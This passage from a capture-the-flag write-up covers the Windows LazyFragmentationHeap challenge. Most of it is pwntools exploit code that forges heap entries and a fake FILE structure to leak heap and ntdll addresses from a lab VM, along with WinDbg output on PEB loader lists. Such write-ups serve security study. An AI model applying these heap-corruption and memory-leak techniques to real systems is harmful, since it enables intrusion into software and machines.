	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">hi</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">open_file</span><span class="p">():</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
 	<span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">cursor</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
	<span class="k">global</span> <span class="n">hi</span><span class="p">,</span> <span class="n">sla</span>
	<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"error"</span>
	<span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
	<span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>

	<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
	<span class="k">except</span> <span class="n">struct</span><span class="p">.</span><span class="n">error</span><span class="p">:</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP_ENTRY not leaked"</span><span class="p">)</span>
		<span class="k">return</span>

	<span class="c1"># log.info("_HEAP-&gt;Encoding = 0x%016x" % heap_encod)
</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>
	<span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
	<span class="s">'''
	0x10000027c80101c8
	   +0x008 Size             : 0x1c8
	   +0x00a Flags            : 0x1 ''
	   +0x00b SmallTagIndex    : 0xc8 ''
	   +0x008 SubSegmentCode   : 0xc80101c8
	   +0x00c PreviousSize     : 0x27
	   +0x00e SegmentOffset    : 0 ''
	   +0x00e LFHFlags         : 0 ''
	   +0x00f UnusedBytes      : 0x10 ''
	'''</span>

	<span class="c1"># log.info("fake XOR'ed _HEAP_ENTRY = 0x%016x" % fake_entry)
</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x1c80</span> <span class="o">-</span>  <span class="c1"># fake chunk size 
</span>	         <span class="mh">0x20</span>   <span class="o">-</span>  <span class="c1"># sizeof(_HEAP_ENTRY) * 2
</span>	         <span class="mh">0x200</span>     <span class="c1"># orginal size of overwritten chunk
</span>	<span class="p">)</span> 
	<span class="n">open_file</span><span class="p">()</span>
	<span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>
	<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>         <span class="c1"># free coalesce mechanism also free'ing chunk 4
</span>	<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># set Flink and Blink at chunk 4
</span>
	<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x150</span>
	<span class="k">if</span> <span class="n">heap_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Heap address not leaked"</span><span class="p">)</span>
        <span class="k">return</span>

	<span class="c1"># default target is ntdll on _HEAP-&gt;LockVariable-&gt;Lock
</span>	<span class="k">if</span> <span class="n">cursor</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
		<span class="n">cursor</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2c0</span>
		
	<span class="c1"># log.info("&amp;_HEAP = 0x%016x" % heap_base)
</span>
	<span class="c1"># make LFH to allocate new Userblock in chunk 4
</span>	<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x14</span><span class="p">):</span>
		<span class="n">open_file</span><span class="p">()</span>

	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xbcd0</span><span class="p">)</span>   <span class="c1"># +0x000 SubSegment
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x12e40</span><span class="p">)</span>  <span class="c1"># +0x008 Reserved
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span>                  <span class="c1"># +0x010 SizeIndexAndPadding
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf0e0d0c0</span><span class="p">)</span>           <span class="c1"># +0x014 Signature
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>                <span class="c1"># I couldn't leak other values
</span>
	<span class="n">fake_FILE</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>              <span class="c1"># _HEAP_ENTRY
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span><span class="p">)</span>             <span class="c1"># cursor of SEEK_CUR
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">)</span>    <span class="c1"># base address
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span>              <span class="c1"># remaining file size
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2041</span><span class="p">)</span>             <span class="c1"># I dunno what they are
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span>				
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

	<span class="n">for_leak</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_HEAP_USERDATA_HEADER</span>
	<span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_FILE</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x1000</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_FILE</span><span class="p">))</span>

	<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">for_leak</span><span class="p">)</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
	<span class="n">read_file</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>

	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
	<span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
	<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"info"</span>
	<span class="k">return</span> <span class="n">result</span>


<span class="n">ntdll_base</span> <span class="o">=</span> <span class="n">leak</span><span class="p">()</span> <span class="o">-</span> <span class="mh">0x163d70</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ntdll = 0x%016x"</span> <span class="o">%</span> <span class="n">ntdll_base</span><span class="p">)</span>
</code></pre>
     </div>
    </div>
    <p><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Since ntdll.dll</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> is a core module of Windows, it does not refer to any external modules, so there is no IAT, but internally, </font><font style="vertical-align: inherit;">there is a Double Linked List of loaded modules called </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PebLdr</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and pointed to by </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_PEB-&gt;Ldr .</font></font></strong><font style="vertical-align: inherit;"></font></p>
    <div class="language-plaintext highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code>0:001&gt; dt ntdll!_PEB @$peb Ldr
   +0x018 Ldr : 0x00007ffd`09c653c0 _PEB_LDR_DATA &lt;---------|
                                                            |
0:001&gt; ? ntdll!PebLdr                                       |
Evaluate expression: 140724767445952 = 00007ffd`09c653c0 &lt;--|

0:001&gt; dt ntdll!_PEB_LDR_DATA 00007ffd`09c653c0
   +0x000 Length           : 0x58
   +0x004 Initialized      : 0x1 ''
   +0x008 SsHandle         : (null) 
   +0x010 InLoadOrderModuleList : _LIST_ENTRY [ 0x0000016c`d7702780 - 0x0000016c`d7705d20 ]
   +0x020 InMemoryOrderModuleList : _LIST_ENTRY [ 0x0000016c`d7702790 - 0x0000016c`d7705d30 ]
   +0x030 InInitializationOrderModuleList : _LIST_ENTRY [ 0x0000016c`d7702610 - 0x0000016c`d7702e40 ]
   +0x040 EntryInProgress  : (null) 
   +0x048 ShutdownInProgress : 0 ''
   +0x050 ShutdownThreadId : (null) 

0:001&gt; dqs 16c`d7702780
0000016c`d7702780  0000016c`d77025f0
0000016c`d7702788  00007ffd`09c653d0 ntdll!PebLdr+0x10
0000016c`d7702790  0000016c`d7702600
0000016c`d7702798  00007ffd`09c653e0 ntdll!PebLdr+0x20
0000016c`d77027a0  00000000`00000000
0000016c`d77027a8  00000000`00000000
0000016c`d77027b0  00007ff7`6f400000 LazyFragmentationHeap
0000016c`d77027b8  00007ff7`6f401bf0 LazyFragmentationHeap+0x1bf0
....
</code></pre>
     </div>
    </div>
    <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">During analysis, I found out that </font><font style="vertical-align: inherit;">the offset of the heap area pointed to by </font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_PEB_LDR_DATA-&gt;InLoadOrderModuleList is always fixed to </font></font></strong><font style="vertical-align: inherit;"></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x27b0</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , so it can be leaked immediately as shown below, and the addresses of other libraries were also obtained through IAT.</font></font></p>
    <div class="language-python highlighter-rouge">
     <div class="highlight">
      <pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># context.log_level = "debug"
</span>
<span class="c1"># HOST = "192.168.56.102" # VirtualBox Host-Only Adapter
</span><span class="n">HOST</span> <span class="o">=</span> <span class="s">"192.168.0.18"</span> <span class="c1"># VirtualBox Bridge 
</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">6677</span>
<span class="n">SIZE</span> <span class="o">=</span> <span class="mh">0xC8</span> <span class="c1"># yes, I intend korean slang
</span>
<span class="n">hi</span> <span class="o">=</span> <span class="bp">None</span>
<span class="n">sla</span> <span class="o">=</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
 	<span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">need_newline</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
	<span class="k">if</span> <span class="n">need_newline</span><span class="p">:</span>
		<span class="n">sla</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">hi</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">hi</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">open_file</span><span class="p">():</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
 	<span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">cursor</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">disconn</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">leakLazy</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
	<span class="k">global</span> <span class="n">hi</span><span class="p">,</span> <span class="n">sla</span>
	<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"error"</span>
	<span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
	<span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>

	<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
	<span class="k">except</span> <span class="n">struct</span><span class="p">.</span><span class="n">error</span><span class="p">:</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP_ENTRY not leaked"</span><span class="p">)</span>
		<span class="k">return</span>

	<span class="c1"># log.info("_HEAP-&gt;Encoding = 0x%016x" % heap_encod)
</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>
	<span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
	<span class="s">'''
	0x10000027c80101c8
	   +0x008 Size             : 0x1c8
	   +0x00a Flags            : 0x1 ''
	   +0x00b SmallTagIndex    : 0xc8 ''
	   +0x008 SubSegmentCode   : 0xc80101c8
	   +0x00c PreviousSize     : 0x27
	   +0x00e SegmentOffset    : 0 ''
	   +0x00e LFHFlags         : 0 ''
	   +0x00f UnusedBytes      : 0x10 ''
	'''</span>

	<span class="c1"># log.info("fake XOR'ed _HEAP_ENTRY = 0x%016x" % fake_entry)
</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x1c80</span> <span class="o">-</span>  <span class="c1"># fake chunk size 
</span>	         <span class="mh">0x20</span>   <span class="o">-</span>  <span class="c1"># sizeof(_HEAP_ENTRY) * 2
</span>	         <span class="mh">0x200</span>     <span class="c1"># orginal size of overwritten chunk
</span>	<span class="p">)</span> 
	<span class="n">open_file</span><span class="p">()</span>
	<span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>
	<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>         <span class="c1"># free coalesce mechanism also free'ing chunk 4
</span>	<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># set Flink and Blink at chunk 4
</span>
	<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x150</span>
	<span class="k">if</span> <span class="n">heap_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Heap address not leaked"</span><span class="p">)</span>
		<span class="k">return</span>

	<span class="k">if</span> <span class="n">leakLazy</span><span class="p">:</span>
		<span class="n">cursor</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x27b2</span> <span class="c1"># can't leak null-byte
</span>	<span class="k">elif</span> <span class="n">cursor</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
		<span class="c1"># default target is ntdll on _HEAP-&gt;LockVariable-&gt;Lock
</span>		<span class="n">cursor</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2c0</span>
		
	<span class="c1"># log.info("&amp;_HEAP = 0x%016x" % heap_base)
</span>
	<span class="c1"># make LFH to allocate new UserBlock in chunk 4
</span>	<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x14</span><span class="p">):</span>
		<span class="n">open_file</span><span class="p">()</span>

	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xbcd0</span><span class="p">)</span>   <span class="c1"># +0x000 SubSegment
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x12e40</span><span class="p">)</span>  <span class="c1"># +0x008 Reserved
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span>                  <span class="c1"># +0x010 SizeIndexAndPadding
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf0e0d0c0</span><span class="p">)</span>           <span class="c1"># +0x014 Signature
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>                <span class="c1"># I couldn't leak other values
</span>
	<span class="n">fake_FILE</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>              <span class="c1"># _HEAP_ENTRY
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span><span class="p">)</span>             <span class="c1"># cursor of SEEK_CUR
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">)</span>    <span class="c1"># base address
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span>              <span class="c1"># remaining file size
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2041</span><span class="p">)</span>             <span class="c1"># I dunno what they are
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span>				
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

	<span class="n">for_leak</span> <span class="o">=</span> <span class="s">""</span>
